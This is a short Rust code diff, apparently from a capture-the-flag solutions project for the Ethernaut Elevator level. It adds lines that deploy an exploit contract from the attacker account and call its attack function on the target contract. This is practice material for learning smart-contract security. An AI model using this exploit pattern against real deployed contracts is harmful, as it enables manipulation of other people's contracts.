@@ -1,3 +1,4 @@
+use crate::abi::elevator_exploit::ElevatorExploit;
 use async_trait::async_trait;
 use ctf::ethernaut::lvl11_elevator::*;
 
@@ -23,6 +24,11 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let exploit =
+            ElevatorExploit::deploy(offender.to_owned(), ())?.send().await?;
+
+        exploit.attack(target.address).send().await?.await?;
+
         Ok(())
     }
 }
